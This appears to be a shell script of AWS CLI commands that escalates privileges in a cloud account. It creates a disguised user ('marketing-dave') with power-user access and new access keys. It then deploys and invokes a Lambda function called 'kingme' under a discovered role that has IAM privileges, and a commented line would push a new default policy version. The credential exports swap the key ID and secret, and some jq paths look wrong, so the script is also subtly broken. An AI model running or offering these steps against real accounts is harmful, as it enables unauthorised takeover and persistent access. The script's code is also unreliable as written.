
role_arn=`aws iam get-role --role-name discovered_role_with_iam_privs | jq '.Role.Arn'  | sed 's|\"||g'`

aws iam create-user --user-name marketing-dave
aws iam add-user-to-group --user-name marketing-dave --group-name PowerUserAccess-marketing-group
aws iam create-access-key --user-name marketing-dave > keys.json


export AWS_SECRET_ACCESS_KEY=`cat keys.json | jq '.AccessKeyId'`
export AWS_ACCESS_KEY_ID=`cat keys.json | jq '.SecretKey'`



aws lambda create-function \
    --function-name kingme \
    --runtime python3.8 \
    --zip-file fileb://kingme.zip \
    --handler kingme.handler \
    --role $role_arn


aws lambda invoke --function-name kingme kingme.out --log-type Tail --query 'LogResult' --output text |  base64 -D

aws iam list-attached-user-policies  --user-name marketing-dave

# aws --profile default iam create-policy-version --policy-arn arn:aws:iam::111111111111:policy/update_iam_policy_xxkd93jal0 --policy-document file://lambda_permissions_policy_doc.json --set-as-default

